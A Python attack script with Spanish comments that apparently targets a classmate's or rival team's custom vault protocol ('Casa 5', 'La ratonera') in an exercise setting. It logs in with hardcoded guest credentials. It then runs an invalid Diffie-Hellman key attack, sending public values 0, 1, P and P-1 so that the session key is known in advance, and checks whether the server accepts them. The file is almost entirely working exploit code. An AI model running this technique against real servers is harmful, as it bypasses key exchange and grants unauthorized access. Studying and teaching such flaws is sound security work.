"""
ataque.py - Lanza el ataque contra la Boveda de la Casa 5 (protocolo "La ratonera").

Hace dos cosas:
  1. Sesion normal de invitado  -> prueba de acceso (lee la boveda con CMD_ASK).
  2. Ataque de clave DH invalida -> manda un A invalido con su K conocido.
     Como el servidor NO valida el valor publico A (seccion 5 del protocolo de ellos),
     calcula K = A^b mod P con el A que le pasamos. Para A en {0, 1, P} el K es fijo y
     lo conocemos de antemano, asi que derivamos las mismas claves de sesion que el
     servidor sin hacer el intercambio DH real.

Antes de correr: calibrar con recon.py y pegar el CONFIG ganador en casa5.py.
Correr con `python ataque.py <IP> [puerto]`  (no `python -I`: usa la libreria cryptography).
"""

import sys

import casa5
from casa5 import CONFIG, P

USUARIO = "ratonton"      # perfil hacinado, publico en el PDF del protocolo
CLAVE = "ratoncinado"


def mostrar(titulo, tipo, mac_ok, datos):
    """Imprime el resultado de un intercambio de forma legible."""
    print(f"  {titulo}: {casa5.nombre(tipo)}  mac_ok={mac_ok}  datos={datos}")


def sesion_invitado(ip, puerto):
    """Handshake normal + login de invitado + un CMD_ASK. Es la prueba de acceso."""
    print("[1] Sesion normal de invitado")
    try:
        with casa5.ClienteCasa5(ip, puerto) as c:
            c.handshake()
            tipo, mac_ok, datos = c.login(USUARIO, CLAVE)
            mostrar("LOGIN", tipo, mac_ok, datos)
            if tipo == casa5.LOGIN_OK:
                tipo, mac_ok, datos = c.comando(casa5.CMD_ASK, **{CONFIG.F_KEY: 0})
                mostrar("CMD_ASK(pagina=0)", tipo, mac_ok, datos)
    except Exception as e:
        print(f"  fallo la sesion normal ({type(e).__name__}: {e})")


def una_inyeccion(ip, puerto, etiqueta, A, K):
    """Un intento del ataque: manda el A invalido con su K conocido y prueba login.

    Si la respuesta del servidor verifica con mac_ok=True, el servidor derivo el
    mismo K que nosotros: acepto el A invalido y el ataque funciono.
    """
    try:
        with casa5.ClienteCasa5(ip, puerto) as c:
            c.handshake(A_forzado=A, K_forzado=K)
            tipo, mac_ok, datos = c.login(USUARIO, CLAVE)
            mostrar(etiqueta, tipo, mac_ok, datos)
            if tipo == casa5.LOGIN_OK:
                tipo, mac_ok, datos = c.comando(casa5.CMD_ASK, **{CONFIG.F_KEY: 0})
                mostrar(etiqueta + " CMD_ASK", tipo, mac_ok, datos)
    except casa5.ErrorCasa5 as e:
        print(f"  {etiqueta}: la conexion se cerro ({e})")
    except Exception as e:
        print(f"  {etiqueta}: error ({type(e).__name__}: {e})")


def ataque_clave_invalida(ip, puerto):
    """Bateria de claves DH invalidas: A en {0, 1, P, P-1} con su K conocido."""
    print("[2] Ataque de clave DH invalida")
    una_inyeccion(ip, puerto, "A=0    -> K=0", 0, 0)
    una_inyeccion(ip, puerto, "A=1    -> K=1", 1, 1)
    una_inyeccion(ip, puerto, "A=P    -> K=0", P, 0)
    # (P-1)^b mod P = 1 si b es par, P-1 si es impar: probamos las dos opciones.
    una_inyeccion(ip, puerto, "A=P-1  -> K=1", P - 1, 1)
    una_inyeccion(ip, puerto, "A=P-1  -> K=P-1", P - 1, P - 1)


def main():
    if len(sys.argv) < 2:
        print("Uso: python ataque.py <IP_de_la_boveda> [puerto]")
        print("La IP se saca con `hostname -I` en la maquina de la boveda. Puerto por defecto 6005.")
        return
    ip = sys.argv[1]
    puerto = int(sys.argv[2]) if len(sys.argv) > 2 else 6005
    print(f"=== Ataque contra {ip}:{puerto} (Casa 5, La ratonera) ===")
    sesion_invitado(ip, puerto)
    ataque_clave_invalida(ip, puerto)


if __name__ == "__main__":
    main()
